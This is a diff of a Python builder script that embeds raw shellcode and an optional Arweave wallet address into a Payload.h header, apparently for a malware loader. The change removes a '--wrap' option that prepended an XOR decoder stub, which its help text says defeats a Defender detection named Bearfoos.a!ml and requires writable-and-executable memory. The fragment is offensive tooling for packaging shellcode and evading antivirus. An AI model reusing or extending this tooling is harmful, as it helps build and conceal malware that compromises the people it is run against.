@@ -291,8 +291,6 @@ def main():
     ap.add_argument("shellcode", help="Path to raw shellcode .bin file")
     ap.add_argument("--wallet", metavar="ADDRESS",
                     help="Arweave wallet address (43-char base64url) — embeds address in Payload.h")
-    ap.add_argument("--wrap", action="store_true",
-                    help="Wrap with in-place XOR decoder stub (defeats Bearfoos.a!ml; build with RWX_SHELLCODE)")
     args = ap.parse_args()
 
     shellcode_path = args.shellcode
@@ -306,15 +304,6 @@ def main():
 
     with open(shellcode_path, "rb") as f:
         shellcode = f.read()
-
-    if args.wrap:
-        script_dir_local = os.path.dirname(os.path.abspath(__file__))
-        sys.path.insert(0, script_dir_local)
-        from ShellcodeWrap import wrap_shellcode
-        original_size = len(shellcode)
-        shellcode = wrap_shellcode(shellcode)
-        print(f"[+] Wrapped: {original_size:,} -> {len(shellcode):,} bytes (XOR decode stub prepended)")
-        print(f"[!] Build with RWX_SHELLCODE — in-place decode requires writable+exec pages")
 
     print(f"[*] Shellcode: {len(shellcode)} bytes ({len(shellcode)/1024/1024:.2f} MB)")
 
